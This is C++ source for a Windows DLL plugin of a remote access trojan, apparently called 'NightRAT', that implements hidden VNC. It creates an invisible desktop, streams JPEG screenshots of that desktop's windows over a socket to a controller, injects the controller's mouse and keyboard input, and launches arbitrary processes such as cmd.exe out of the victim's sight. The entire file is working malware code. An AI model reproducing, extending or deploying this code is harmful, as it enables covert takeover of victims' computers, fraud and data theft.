#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <objbase.h>
#include <propidl.h>
#include <gdiplus.h>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <queue>
#include <atomic>
#include <condition_variable>
#include <algorithm>
#include "../../include/json.hpp"

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

// Protocol constants
static const uint16_t PACKET_SIGNATURE = 0x524E; // 'NR'
static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
static const uint32_t FRAME_FORMAT_JPEG = 1;

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct HVNCFrameHeader {
    uint32_t monitor; // Used for cursor shape
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

// Global state
static atomic_bool g_running(false);
static SOCKET g_socket = INVALID_SOCKET;
static atomic<int> g_quality(50);
static atomic<int> g_fps(20);
static HDESK g_hDesktop = NULL;
static wstring g_desktopName = L"NightRAT_HiddenDesktop";

static mutex g_sendMutex;
static mutex g_frameMutex;
static condition_variable g_frameCV;
struct FrameData {
    HBITMAP hBmp;
    int dw, dh;
    int cursor;
};
static queue<FrameData> g_frameQueue;

static mutex g_inputMutex;
static condition_variable g_inputCV;
struct InputTask {
    string action;
    json cmd;
};
static queue<InputTask> g_inputQueue;

static HWND g_hFocus = NULL;
static HWND g_hLastWin = NULL;
static bool g_dragging = false;
static HWND g_dragHwnd = NULL;
static RECT g_dragStartRect;
static POINT g_dragStartPt;
static LRESULT g_dragHT = HTCLIENT;

static mutex g_gdiMutex;
static ULONG_PTR g_gdiToken = 0;

// Helpers
static void send_raw(const void* data, int len) {
    if (g_socket == INVALID_SOCKET || !g_running) return;
    lock_guard<mutex> lock(g_sendMutex);
    const char* p = (const char*)data;
    while (len > 0) {
        int s = send(g_socket, p, len, 0);
        if (s <= 0) break;
        p += s; len -= s;
    }
}

static void send_json(const json& j) {
    string s = j.dump() + "\r\n";
    send_raw(s.c_str(), (int)s.size());
}

static void send_status(const string& m) {
    json j; j["action"] = "hvnc_status"; j["message"] = m;
    send_json(j);
}

static bool init_gdiplus() {
    lock_guard<mutex> lock(g_gdiMutex);
    if (g_gdiToken) return true;
    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiToken, &input, NULL) == Ok;
}

static int get_encoder(const WCHAR* mime, CLSID* clsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    vector<BYTE> buf(size);
    ImageCodecInfo* p = (ImageCodecInfo*)buf.data();
    GetImageEncoders(num, size, p);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(p[i].MimeType, mime) == 0) {
            *clsid = p[i].Clsid;
            return i;
        }
    }
    return -1;
}

static bool attach_desktop() {
    if (!g_hDesktop) {
        g_hDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
        if (!g_hDesktop) g_hDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
    }
    if (!g_hDesktop) return false;
    return SetThreadDesktop(g_hDesktop);
}

static wstring to_wstr(const string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
    if (n <= 0) return L"";
    vector<wchar_t> b(n);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, b.data(), n);
    return wstring(b.data());
}

static int GetCursorIdx(HCURSOR h) {
    if (h == LoadCursor(NULL, IDC_ARROW)) return 1; if (h == LoadCursor(NULL, IDC_IBEAM)) return 2;
    if (h == LoadCursor(NULL, IDC_WAIT)) return 3; if (h == LoadCursor(NULL, IDC_CROSS)) return 4;
    if (h == LoadCursor(NULL, IDC_UPARROW)) return 5; if (h == LoadCursor(NULL, IDC_SIZENWSE)) return 8;
    if (h == LoadCursor(NULL, IDC_SIZENESW)) return 9; if (h == LoadCursor(NULL, IDC_SIZEWE)) return 10;
    if (h == LoadCursor(NULL, IDC_SIZENS)) return 11; if (h == LoadCursor(NULL, IDC_SIZEALL)) return 12;
    if (h == LoadCursor(NULL, IDC_NO)) return 13; if (h == LoadCursor(NULL, IDC_HAND)) return 14;
    if (h == LoadCursor(NULL, IDC_APPSTARTING)) return 15; if (h == LoadCursor(NULL, IDC_HELP)) return 16;
    return 0;
}

// Workers
static void frame_worker() {
    CoInitialize(NULL);
    if (!init_gdiplus()) { send_status("Error: GDI+ Failed"); return; }
    CLSID clsid; if (get_encoder(L"image/jpeg", &clsid) < 0) { send_status("Error: No JPEG encoder"); return; }
    while (g_running) {
        FrameData f;
        {
            unique_lock<mutex> lock(g_frameMutex);
            g_frameCV.wait(lock, [] { return !g_frameQueue.empty() || !g_running; });
            if (!g_running && g_frameQueue.empty()) break;
            f = g_frameQueue.front(); g_frameQueue.pop();
        }
        vector<BYTE> jpeg;
        {
            Bitmap source(f.hBmp, NULL);
            Bitmap* target = &source;
            bool scaled = false;
            if (source.GetWidth() != (UINT)f.dw || source.GetHeight() != (UINT)f.dh) {
                target = new Bitmap(f.dw, f.dh, PixelFormat32bppARGB);
                Graphics g(target);
                g.SetInterpolationMode(InterpolationModeBilinear);
                g.DrawImage(&source, 0, 0, f.dw, f.dh);
                scaled = true;
            }
            IStream* stream = NULL;
            if (CreateStreamOnHGlobal(NULL, TRUE, &stream) == S_OK) {
                ULONG q = (ULONG)g_quality; EncoderParameters p; p.Count = 1;
                p.Parameter[0].Guid = EncoderQuality; p.Parameter[0].Type = EncoderParameterValueTypeLong;
                p.Parameter[0].NumberOfValues = 1; p.Parameter[0].Value = &q;
                if (target->Save(stream, &clsid, &p) == Ok) {
                    STATSTG stat; stream->Stat(&stat, STATFLAG_NONAME);
                    jpeg.resize((size_t)stat.cbSize.QuadPart);
                    LARGE_INTEGER li = {0}; stream->Seek(li, STREAM_SEEK_SET, NULL);
                    ULONG read; stream->Read(jpeg.data(), (ULONG)jpeg.size(), &read);
                }
                stream->Release();
            }
            if (scaled) delete target;
        }
        DeleteObject(f.hBmp);
        if (!jpeg.empty()) {
            HVNCFrameHeader fh = { (uint32_t)f.cursor, (uint32_t)g_quality, (uint32_t)g_fps, (uint32_t)f.dw, (uint32_t)f.dh, FRAME_FORMAT_JPEG, (uint32_t)jpeg.size() };
            PacketHeader ph = { PACKET_SIGNATURE, PACKET_TYPE_HVNC_FRAME, (uint32_t)(sizeof(fh) + jpeg.size()) };
            vector<BYTE> pkt(sizeof(ph) + sizeof(fh) + jpeg.size());
            memcpy(pkt.data(), &ph, sizeof(ph));
            memcpy(pkt.data() + sizeof(ph), &fh, sizeof(fh));
            memcpy(pkt.data() + sizeof(ph) + sizeof(fh), jpeg.data(), jpeg.size());
            send_raw(pkt.data(), (int)pkt.size());
        }
    }
    CoUninitialize();
}

struct WinInfo { HWND hwnd; RECT rect; };
static BOOL CALLBACK EnumWinProc(HWND hwnd, LPARAM lp) {
    if (IsWindowVisible(hwnd)) { RECT r; if (GetWindowRect(hwnd, &r)) ((vector<WinInfo>*)lp)->push_back({hwnd, r}); }
    return TRUE;
}

static void capture_loop() {
    CoInitialize(NULL);
    if (!attach_desktop()) { send_status("Error: Desktop attach failed"); return; }
    HDC hdcScr = NULL, hdcMem = NULL, hdcWin = NULL; HBITMAP hbmpMem = NULL;
    int lastW = 0, lastH = 0, enumCnt = 0; vector<WinInfo> windows;
    while (g_running) {
        DWORD start = GetTickCount();
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        if (sw <= 0 || sh <= 0) { Sleep(100); continue; }
        if (sw != lastW || sh != lastH || !hdcScr) {
            if (hdcWin) DeleteDC(hdcWin); if (hbmpMem) DeleteObject(hbmpMem); if (hdcMem) DeleteDC(hdcMem);
            if (hdcScr) ReleaseDC(NULL, hdcScr);
            hdcScr = GetDC(NULL); hdcMem = CreateCompatibleDC(hdcScr);
            hbmpMem = CreateCompatibleBitmap(hdcScr, sw, sh); hdcWin = CreateCompatibleDC(hdcScr);
            lastW = sw; lastH = sh;
        }
        HGDIOBJ oldMem = SelectObject(hdcMem, hbmpMem);
        RECT r = {0, 0, sw, sh}; FillRect(hdcMem, &r, (HBRUSH)GetStockObject(BLACK_BRUSH));
        if (enumCnt-- <= 0) { windows.clear(); EnumDesktopWindows(g_hDesktop, EnumWinProc, (LPARAM)&windows); reverse(windows.begin(), windows.end()); enumCnt = 15; }
        for (auto& w : windows) {
            if (!IsWindow(w.hwnd) || !IsWindowVisible(w.hwnd)) continue;
            GetWindowRect(w.hwnd, &w.rect); int ww = w.rect.right - w.rect.left, wh = w.rect.bottom - w.rect.top;
            if (ww <= 0 || wh <= 0) continue;
            HBITMAP hbmpWin = CreateCompatibleBitmap(hdcScr, ww, wh); HGDIOBJ oldWin = SelectObject(hdcWin, hbmpWin);
            if (!PrintWindow(w.hwnd, hdcWin, 0x02)) {
                HDC hdcRW = GetWindowDC(w.hwnd); if (hdcRW) { BitBlt(hdcWin, 0, 0, ww, wh, hdcRW, 0, 0, SRCCOPY); ReleaseDC(w.hwnd, hdcRW); }
            }
            BitBlt(hdcMem, w.rect.left, w.rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
            SelectObject(hdcWin, oldWin); DeleteObject(hbmpWin);
        }
        int curIdx = 0; CURSORINFO ci = { sizeof(ci) };
        if (GetCursorInfo(&ci) && (ci.flags & 0x01)) {
            curIdx = GetCursorIdx(ci.hCursor); ICONINFO ii = {0};
            if (GetIconInfo(ci.hCursor, &ii)) {
                DrawIcon(hdcMem, ci.ptScreenPos.x - ii.xHotspot, ci.ptScreenPos.y - ii.yHotspot, ci.hCursor);
                if (ii.hbmMask) DeleteObject(ii.hbmMask); if (ii.hbmColor) DeleteObject(ii.hbmColor);
            }
        }
        HBITMAP hbmpCopy = CreateCompatibleBitmap(hdcScr, sw, sh); HDC hdcCopy = CreateCompatibleDC(hdcScr);
        HGDIOBJ oldCopy = SelectObject(hdcCopy, hbmpCopy); BitBlt(hdcCopy, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
        SelectObject(hdcCopy, oldCopy); DeleteDC(hdcCopy);
        FrameData f; f.hBmp = hbmpCopy; f.cursor = curIdx;
        f.dw = (sw * g_quality) / 100; f.dh = (sh * g_quality) / 100;
        if (f.dw < 1) f.dw = 1; if (f.dh < 1) f.dh = 1;
        { lock_guard<mutex> lock(g_frameMutex);
            while (g_frameQueue.size() >= 2) { FrameData old = g_frameQueue.front(); g_frameQueue.pop(); DeleteObject(old.hBmp); }
            g_frameQueue.push(f); g_frameCV.notify_one();
        }
        SelectObject(hdcMem, oldMem);
        DWORD interval = 1000 / (g_fps > 0 ? (int)g_fps : 1);
        DWORD elapsed = GetTickCount() - start; if (elapsed < interval) Sleep(interval - elapsed);
    }
    if (hdcWin) DeleteDC(hdcWin); if (hbmpMem) DeleteObject(hbmpMem); if (hdcMem) DeleteDC(hdcMem); if (hdcScr) ReleaseDC(NULL, hdcScr);
    CoUninitialize();
}

static void input_worker() {
    CoInitialize(NULL);
    if (!attach_desktop()) return;
    while (g_running) {
        InputTask t;
        { unique_lock<mutex> lock(g_inputMutex); g_inputCV.wait(lock, [] { return !g_inputQueue.empty() || !g_running; });
          if (!g_running && g_inputQueue.empty()) break; t = g_inputQueue.front(); g_inputQueue.pop();
        }
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        POINT pt = { (t.cmd.value("x", 0) * sw) / 65535, (t.cmd.value("y", 0) * sh) / 65535 };
        if (t.action == "hvnc_mousemove") {
            if (g_dragging && g_dragHwnd) {
                int dx = pt.x - g_dragStartPt.x, dy = pt.y - g_dragStartPt.y;
                if (g_dragHT == HTCAPTION) SetWindowPos(g_dragHwnd, NULL, g_dragStartRect.left + dx, g_dragStartRect.top + dy, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
                else {
                    RECT r = g_dragStartRect; int w = r.right - r.left, h = r.bottom - r.top;
                    switch (g_dragHT) {
                        case HTRIGHT: w += dx; break; case HTBOTTOM: h += dy; break; case HTBOTTOMRIGHT: w += dx; h += dy; break;
                        case HTLEFT: r.left += dx; w -= dx; break; case HTTOP: r.top += dy; h -= dy; break;
                        case HTTOPLEFT: r.left += dx; w -= dx; r.top += dy; h -= dy; break;
                        case HTTOPRIGHT: w += dx; r.top += dy; h -= dy; break; case HTBOTTOMLEFT: r.left += dx; w -= dx; h += dy; break;
                    }
                    if (w < 100) w = 100; if (h < 50) h = 50; SetWindowPos(g_dragHwnd, NULL, r.left, r.top, w, h, SWP_NOZORDER | SWP_NOACTIVATE);
                }
            } else {
                HWND h = WindowFromPoint(pt); if (h) { LRESULT ht; if (SendMessageTimeoutW(h, WM_NCHITTEST, 0, MAKELPARAM(pt.x, pt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) {
                        if (ht == HTCLIENT) { ScreenToClient(h, &pt); PostMessageW(h, WM_MOUSEMOVE, 0, MAKELPARAM(pt.x, pt.y)); }
                        else PostMessageW(h, WM_NCMOUSEMOVE, (WPARAM)ht, MAKELPARAM(pt.x, pt.y));
                    }
                }
            }
        } else if (t.action == "hvnc_mousedown") {
            int b = t.cmd.value("button", 0); HWND h = WindowFromPoint(pt);
            if (h) {
                HWND hr = GetAncestor(h, GA_ROOT); g_hLastWin = hr;
                LRESULT ht; if (!SendMessageTimeoutW(h, WM_NCHITTEST, 0, MAKELPARAM(pt.x, pt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) ht = HTCLIENT;
                if (GetForegroundWindow() != hr) { AllowSetForegroundWindow(ASFW_ANY); SetForegroundWindow(hr); BringWindowToTop(hr); }
                g_hFocus = (ht == HTCLIENT) ? h : hr;
                if (ht != HTCLIENT) {
                    if (b == 0) {
                        if (ht == HTCLOSE) PostMessageW(hr, WM_SYSCOMMAND, SC_CLOSE, 0);
                        else if (ht == HTMINBUTTON) PostMessageW(hr, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                        else if (ht == HTMAXBUTTON) { WINDOWPLACEMENT wp = {sizeof(wp)}; GetWindowPlacement(hr, &wp); PostMessageW(hr, WM_SYSCOMMAND, (wp.showCmd == SW_SHOWMAXIMIZED) ? SC_RESTORE : SC_MAXIMIZE, 0); }
                        else if (ht == HTCAPTION || (ht >= HTLEFT && ht <= HTBOTTOMRIGHT)) { g_dragging = true; g_dragHwnd = hr; g_dragStartPt = pt; g_dragHT = ht; GetWindowRect(hr, &g_dragStartRect); }
                    }
                    UINT m = (b == 1) ? WM_NCRBUTTONDOWN : (b == 2 ? WM_NCMBUTTONDOWN : WM_NCLBUTTONDOWN); PostMessageW(h, m, (WPARAM)ht, MAKELPARAM(pt.x, pt.y));
                } else {
                    ScreenToClient(h, &pt); UINT m = (b == 0) ? WM_LBUTTONDOWN : (b == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
                    WPARAM wp = (b == 0) ? MK_LBUTTON : (b == 1 ? MK_RBUTTON : MK_MBUTTON); PostMessageW(h, m, wp, MAKELPARAM(pt.x, pt.y));
                }
            }
        } else if (t.action == "hvnc_mouseup") {
            int b = t.cmd.value("button", 0); if (b == 0) { g_dragging = false; g_dragHwnd = NULL; }
            HWND h = WindowFromPoint(pt); if (h) {
                LRESULT ht; if (!SendMessageTimeoutW(h, WM_NCHITTEST, 0, MAKELPARAM(pt.x, pt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) ht = HTCLIENT;
                if (ht != HTCLIENT) { UINT m = (b == 1) ? WM_NCRBUTTONUP : (b == 2 ? WM_NCMBUTTONUP : WM_NCLBUTTONUP); PostMessageW(h, m, (WPARAM)ht, MAKELPARAM(pt.x, pt.y)); }
                else { ScreenToClient(h, &pt); UINT m = (b == 0) ? WM_LBUTTONUP : (b == 1 ? WM_RBUTTONUP : WM_MBUTTONUP); PostMessageW(h, m, 0, MAKELPARAM(pt.x, pt.y)); }
            }
        } else if (t.action == "hvnc_doubleclick") {
            HWND h = WindowFromPoint(pt); if (h) { ScreenToClient(h, &pt); int b = t.cmd.value("button", 0); UINT m = (b == 0) ? WM_LBUTTONDBLCLK : (b == 1 ? WM_RBUTTONDBLCLK : WM_MBUTTONDBLCLK); PostMessageW(h, m, 0, MAKELPARAM(pt.x, pt.y)); }
        } else if (t.action.find("hvnc_key") != string::npos || t.action == "hvnc_char") {
            int vk = t.cmd.value("keycode", 0); HWND h = g_hFocus; if (!h) h = GetForegroundWindow();
            if (h) {
                if (t.action == "hvnc_keydown") PostMessageW(h, WM_KEYDOWN, vk, 1);
                else if (t.action == "hvnc_keyup") PostMessageW(h, WM_KEYUP, vk, 0xC0000001);
                else if (t.action == "hvnc_char") PostMessageW(h, WM_CHAR, vk, 1);
            }
        }
    }
    CoUninitialize();
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET s) { g_socket = s; }

extern "C" __declspec(dllexport) void HandleCommand(SOCKET s, const char* c) {
    try {
        json j = json::parse(c); string a = j.value("action", ""); g_socket = s;
        if (a == "hvnc_start") {
            g_quality = j.value("quality", 50);
            if (!g_running.exchange(true)) {
                thread(frame_worker).detach(); thread(capture_loop).detach(); thread(input_worker).detach();
                send_status("HVNC Started");
            }
        } else if (a == "hvnc_stop") {
            g_running = false; g_frameCV.notify_all(); g_inputCV.notify_all(); send_status("HVNC Stopped");
        } else if (a == "hvnc_quality") {
            g_quality = j.value("quality", 50);
        } else if (a == "hvnc_run") {
            attach_desktop(); wstring p = to_wstr(j.value("path", "cmd.exe"));
            wstring dn = L"WinSta0\\" + g_desktopName;
            STARTUPINFOW si = {sizeof(si)}; si.lpDesktop = (LPWSTR)dn.c_str();
            PROCESS_INFORMATION pi;
            if (CreateProcessW(NULL, (LPWSTR)p.c_str(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread); send_status("Process started");
            } else send_status("Failed to start process");
        } else {
            lock_guard<mutex> lock(g_inputMutex); g_inputQueue.push({a, j}); g_inputCV.notify_one();
        }
    } catch(...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD r, LPVOID) {
    if (r == DLL_PROCESS_DETACH) { g_running = false; g_frameCV.notify_all(); g_inputCV.notify_all(); }
    return TRUE;
}